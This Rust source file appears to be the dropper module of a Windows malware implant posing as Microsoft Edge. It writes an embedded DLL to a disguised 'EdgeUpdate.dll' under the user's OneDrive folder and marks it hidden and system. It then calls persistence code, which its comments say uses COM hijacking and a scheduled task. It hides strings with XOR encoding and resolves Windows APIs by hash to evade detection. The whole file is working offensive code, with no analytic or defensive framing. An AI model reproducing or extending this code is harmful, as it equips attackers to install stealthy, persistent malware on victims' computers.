//! # Dropper Module
//!
//! Handles dropping the embedded DLL payload to disk and setting up persistence.
//! This is the main execution flow for edge.exe as a dropper.

use log::info;

pub use super::embedded_payload::{PAYLOAD_DLL, is_payload_available, get_payload};


/// Execute dropper logic:
/// 1. Drop DLL to hidden location
/// 2. Setup COM hijacking (registry points to DLL)
/// 3. Setup scheduled task (backup)
/// 4. Self-delete
#[cfg(target_os = "windows")]
pub fn execute_dropper() -> Result<(), String> {
    use crate::s::windows::api_resolver::{self, resolve_api, to_wide};
    use crate::s::windows::api_resolver::{HASH_KERNEL32, HASH_CREATE_DIRECTORY_W, HASH_CREATE_FILE_W, HASH_WRITE_FILE, HASH_CLOSE_HANDLE, HASH_SET_FILE_ATTRIBUTES_W};
    use crate::s::windows::persistence;
    use std::ptr;

    crate::k::debug::log_stage!(5, "Dropper: Starting DLL Drop...");
    
    // Check if payload is available
    if !is_payload_available() {
        crate::k::debug::log_err!("Dropper: No embedded payload found!");
        return Err("No payload".to_string());
    }
    
    let payload = get_payload();
    crate::k::debug::log_detail!("Payload Size: {} bytes", payload.len());
    
    // XOR decode helper (same as mod.rs)
    fn x(encoded: &[u8]) -> String {
        encoded.iter().map(|b| (*b ^ 0x55) as char).collect()
    }
    
    // Get target path
    let env_key = x(&[0x14, 0x05, 0x05, 0x11, 0x14, 0x01, 0x14]); // APPDATA
    let appdata = std::env::var(&env_key).unwrap_or_else(|_| r"C:\Windows\Temp".to_string());
    
    // Microsoft\OneDrive folder (less monitored)
    let p1 = x(&[0x09, 0x18, 0x3C, 0x36, 0x27, 0x3A, 0x26, 0x3A, 0x33, 0x21]); // \Microsoft
    let p2 = x(&[0x09, 0x1A, 0x3B, 0x30, 0x11, 0x27, 0x3C, 0x23, 0x30]); // \OneDrive
    
    let target_dir = format!("{}{}{}", appdata, p1, p2);
    // EdgeUpdate.dll
    let dll_name = x(&[0x10, 0x31, 0x32, 0x30, 0x00, 0x25, 0x31, 0x34, 0x21, 0x30, 0x7B, 0x31, 0x39, 0x39]);
    let dll_path = format!("{}\\{}", target_dir, dll_name);
    
    crate::k::debug::log_detail!("DLL Target: {}", dll_path);
    
    // Write DLL to disk
    unsafe {
        // Create directories (nested - must create parents first)
        if let Some(create_dir) = resolve_api::<unsafe extern "system" fn(*const u16, *const std::ffi::c_void) -> i32>(
            HASH_KERNEL32, HASH_CREATE_DIRECTORY_W
        ) {
            // First create Microsoft folder
            let microsoft_dir = format!("{}{}", appdata, p1);
            let dir_wide = to_wide(&microsoft_dir);
            let _ = create_dir(dir_wide.as_ptr(), ptr::null());
            
            // Then create OneDrive folder
            let dir_wide2 = to_wide(&target_dir);
            let _ = create_dir(dir_wide2.as_ptr(), ptr::null());
            
            crate::k::debug::log_detail!("Created target directory: {}", target_dir);
        }
        
        // Write file
        type CreateFileW = unsafe extern "system" fn(*const u16, u32, u32, *const std::ffi::c_void, u32, u32, isize) -> isize;
        type WriteFile = unsafe extern "system" fn(isize, *const u8, u32, *mut u32, *const std::ffi::c_void) -> i32;
        type CloseHandle = unsafe extern "system" fn(isize) -> i32;
        
        let create_file: CreateFileW = resolve_api(HASH_KERNEL32, HASH_CREATE_FILE_W)
            .ok_or("E20")?;
        let write_file: WriteFile = resolve_api(HASH_KERNEL32, HASH_WRITE_FILE)
            .ok_or("E21")?;
        let close_handle: CloseHandle = resolve_api(HASH_KERNEL32, HASH_CLOSE_HANDLE)
            .ok_or("E22")?;
        
        let path_wide = to_wide(&dll_path);
        
        // GENERIC_WRITE=0x40000000, CREATE_ALWAYS=2, FILE_ATTRIBUTE_NORMAL=0x80
        let handle = create_file(path_wide.as_ptr(), 0x40000000, 0, ptr::null(), 2, 0x80, 0);
        if handle == -1 {
            crate::k::debug::log_err!("Failed to create DLL file");
            return Err("CreateFile failed".to_string());
        }
        
        let mut written: u32 = 0;
        let result = write_file(handle, payload.as_ptr(), payload.len() as u32, &mut written, ptr::null());
        close_handle(handle);
        
        if result == 0 {
            crate::k::debug::log_err!("Failed to write DLL bytes");
            return Err("WriteFile failed".to_string());
        }
        
        crate::k::debug::log_detail!("Bytes Written: {}", written);
        
        // Set hidden+system attributes
        if let Some(set_attrs) = resolve_api::<unsafe extern "system" fn(*const u16, u32) -> i32>(
            HASH_KERNEL32, HASH_SET_FILE_ATTRIBUTES_W
        ) {
            // FILE_ATTRIBUTE_HIDDEN(2) | FILE_ATTRIBUTE_SYSTEM(4)
            set_attrs(path_wide.as_ptr(), 0x02 | 0x04);
        }
    }
    
    crate::k::debug::log_stage!(6, "Dropper: DLL Dropped Successfully");
    
    // Apply persistence with DLL path (not EXE!)
    persistence::apply_persistence_for_dll(&dll_path);
    crate::k::debug::log_stage!(7, "Dropper: Persistence Applied");
    
    Ok(())
}

#[cfg(not(target_os = "windows"))]
pub fn execute_dropper() -> Result<(), String> {
    Err("Not Windows".to_string())
}
